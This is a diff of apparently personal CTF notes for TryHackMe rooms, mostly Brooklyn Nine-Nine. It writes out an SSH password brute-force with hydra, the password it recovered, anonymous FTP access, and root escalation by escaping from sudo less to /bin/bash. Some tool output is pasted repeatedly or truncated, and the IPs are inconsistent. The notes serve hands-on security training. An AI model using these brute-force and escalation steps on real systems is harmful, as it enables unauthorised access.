@@ -2,156 +2,197 @@
 [https://tryhackme.com/room/brooklynninenine](https://tryhackme.com/room/brooklynninenine)
 
 ## Target Info
-- IP: 10.10.94.131
+- IP: 10.10.251.27
 - OS: 
 
 ## 1. Enumeration
-- nmap scan: nmap -sV -O 10.10.94.131
-- Open ports: 80, 3389
+
+### nmap
 
 ```
-PORT     STATE SERVICE       VERSION
-80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-3389/tcp open  ms-wbt-server Microsoft Terminal Services
+> sudo nmap -sV -O 10.10.251.27
+
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
 ```
 
-- Details
-  - Anthem.com. Site of Blogite
-- gobuster
+#### 80
+- 画像が貼ってあるページ。画面を縮小しても最大サイズになることを確認してください的な文言
+- Have you ever heard of steganography?の文言
+- 画像の中にアクセス情報入ってたりするのか？
+- 画像のパス発見したので中身見てみる
+- 画像を調べる
 
 ```
-gobuster dir -u http://10.10.94.131 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http
+file brooklyn99.jpg 
+brooklyn99.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 533x300, components 3
 ```
 
-- dirsearch -u 
-
 ```
-[02:49:10] 403 -  312B  - /%2e%2e//google.com
-[02:49:11] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-[02:49:45] 301 -  149B  - /.vscode  ->  http://anthem.com/.vscode/
-[02:50:05] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
-[02:53:41] 301 -  118B  - /archive  ->  /
-[02:53:42] 301 -  118B  - /archive.aspx  ->  /
-[02:54:11] 500 -   45B  - /base/static/c
-[02:54:23] 200 -    5KB - /blog/
-[02:54:23] 200 -    5KB - /blog
-[02:54:40] 200 -    3KB - /categories
-[02:54:42] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-[02:57:33] 302 -  126B  - /INSTALL  ->  /umbraco/
-[02:57:33] 302 -  126B  - /Install  ->  /umbraco/
-[02:57:33] 302 -  126B  - /install  ->  /umbraco/
-[02:57:34] 302 -  126B  - /install/  ->  /umbraco/
-[03:01:17] 200 -  192B  - /robots.txt
-[03:01:21] 200 -    2KB - /rss
-[03:01:28] 200 -    3KB - /Search
-[03:01:28] 200 -    3KB - /search
-[03:01:53] 200 -    1KB - /sitemap
-[03:02:43] 200 -    3KB - /tags
-[03:03:10] 403 -    2KB - /Trace.axd
-```
-
-- Using Gobuster, the following paths were discovered:
-  - /assets
-  - /fuel
-  - /offline
-- /
-  - Flag Discovery
-  - THM{G!T_G00D}
-- robots.txt
-  - UmbracoIsTheBest!
-- /authors
-  - Flag Discovery
-  - THM{L0L_WH0_D15}
-- /sitemap
-  - XML file.
-  - Probably a file containing logs.
-
-```
-<urlset xsi:schemalocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
-<url>
-<loc>http://10.10.94.131/blog/</loc>
-<lastmod>2020-04-05T20:37:17+00:00</lastmod>
-</url>
-<url>
-<loc>http://10.10.94.131/archive/</loc>
-<lastmod>2020-04-05T19:11:38+00:00</lastmod>
-</url>
-<url>
-<loc>http://10.10.94.131/archive/we-are-hiring/</loc>
-<lastmod>2020-04-05T21:01:02+00:00</lastmod>
-</url>
-<url>
-<loc>
-http://10.10.94.131/archive/a-cheers-to-our-it-department/
-</loc>
-<lastmod>2020-04-05T21:02:29+00:00</lastmod>
-</url>
-<url>
-<loc>http://10.10.94.131/authors/</loc>
-<lastmod>2020-04-05T23:13:00+00:00</lastmod>
-</url>
-<url>
-<loc>http://10.10.94.131/authors/jane-doe/</loc>
-<lastmod>2020-04-05T21:11:16+00:00</lastmod>
-</url>
-</urlset>
-```
-- Email
-  - JD@anthem.com
-- 3389 connection
-
-```
-nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info -sV 10.10.94.131
-
-Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-15 14:27 BST
-Nmap scan report for 10.10.94.131
-Host is up (0.00094s latency).
-
-PORT     STATE SERVICE       VERSION
-3389/tcp open  ms-wbt-server Microsoft Terminal Services
-| rdp-enum-encryption: 
-|   Security layer
-|     CredSSP (NLA): SUCCESS
-|     CredSSP with Early User Auth: SUCCESS
-|     RDSTLS: SUCCESS
-|     SSL: SUCCESS
-|_  RDP Protocol Version:  RDP 10.6 server
-| rdp-ntlm-info: 
-|   Target_Name: WIN-LU09299160F
-|   NetBIOS_Domain_Name: WIN-LU09299160F
-|   NetBIOS_Computer_Name: WIN-LU09299160F
-|   DNS_Domain_Name: WIN-LU09299160F
-|   DNS_Computer_Name: WIN-LU09299160F
-|   Product_Version: 10.0.17763
-|_  System_Time: 2025-05-15T13:27:09+00:00
-MAC Address: 02:54:1F:FF:87:BF (Unknown)
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
+ExifTool Version Number         : 13.30
+File Name                       : brooklyn99.jpg
+Directory                       : .
+File Size                       : 70 kB
+File Modification Date/Time     : 2025:06:03 23:37:41+09:00
+File Access Date/Time           : 2025:06:03 23:37:46+09:00
+File Inode Change Date/Time     : 2025:06:03 23:37:44+09:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Image Width                     : 533
+Image Height                    : 300
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 533x300
+Megapixels                      : 0.160
+ryotanoMacBook-ea:Desktop ryota$ exiftool brooklyn99.jpg
+ExifTool Version Number         : 13.30
+File Name                       : brooklyn99.jpg
+Directory                       : .
+File Size                       : 70 kB
+File Modification Date/Time     : 2025:06:03 23:37:41+09:00
+File Access Date/Time           : 2025:06:03 23:37:46+09:00
+File Inode Change Date/Time     : 2025:06:03 23:37:44+09:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Image Width                     : 533
+Image Height                    : 300
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 533x300
+Megapixels                      : 0.
+ExifTool Version Number         : 13.30
+File Name                       : brooklyn99.jpg
+Directory                       : .
+File Size                       : 70 kB
+File Modification Date/Time     : 2025:06:03 23:37:41+09:00
+File Access Date/Time           : 2025:06:03 23:37:46+09:00
+File Inode Change Date/Time     : 2025:06:03 23:37:44+09:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Image Width                     : 533
+Image Height                    : 300
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 533x300
+Megapixels                      : 0.160
 ```
 
-- Umbroco CMS
+- 特に怪しいところはなし
+
+
+### gobuster
+
+- gobuster dir -u http://10.10.251.27 -w common.txt http
 
 ```
-Umbraco.Sys.ServerVariables = {
-  "umbracoUrls": {
-    "externalLoginsUrl": "/umbraco/ExternalLogin",
-    "serverVarsJs": "/umbraco/ServerVariables",
-    "authenticationApiBaseUrl": "/umbraco/backoffice/UmbracoApi/Authentication/",
-    "currentUserApiBaseUrl": "/umbraco/backoffice/UmbracoApi/CurrentUser/"
-  },
-  ...
-}
+> gobuster dir -u http://10.10.251.27 -w common.txt http
+
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/index.html           (Status: 200) [Size: 718]
+/server-status        (Status: 403) [Size: 277]
 ```
 
-- searchexploit
-  - searchsploit umbraco
-  - searchsploit -m 19671
-  - cat 19671.py
+- /index.html はトップと同じ
 
+## FTP 
+- lftp -u anonymous 10.10.104.75
+- パスワードなしのユーザで進入
 
+```
+lftp -u anonymous 10.10.104.75
+パスワード: 
+lftp anonymous@10.10.104.75:~> ls                                       
+-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+```
 
+- get note_to_jake.txt で中身を確認
+
+```
+From Amy,
+
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+```
+
+- jakeというユーザのパスワードが弱いらしい。おそらくsshの話
+ 
+## hydra
+
+```
+hydra -l jake -P rockyou.txt -f -o found.txt ssh://10.10.104.75
+
+[DATA] attacking ssh://10.10.104.75:22/
+[22][ssh] host: 10.10.104.75   login: jake   password: 987654321
+[STATUS] attack finished for 10.10.104.75 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-04 22:20:27
+```
+
+- jakeはpassword 987654321
+
+## ssh
+
+- ssh jake@10.10.104.75 でログイン成功
+- でログイン成功
+
+## ログイン後の話
+- id
+  - uid=1000(jake) gid=1000(jake) groups=1000(jake)
+- pwd
+  - /home/jake
+- whois
+  - コマンドなし
+- sudo -l
+  - /usr/bin/lessがパスワードなしでsudo実行できる
+
+```
+Matching Defaults entries for jake on brookly_nine_nine:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /usr/bin/less
+```
+
+- find / -user root -perm -u=s -type f 2>/dev/null
+
+## 一般ユーザフラグ
+- /home/holtにuser.txt発見
+
+## ルートユーザー
+- sudo less user.txtでファイルを開き
+- !/bin/bashでbashをルートユーザで起動
+- /home/rootにroot.txt発見
 
 ## 2. Exploitation
 
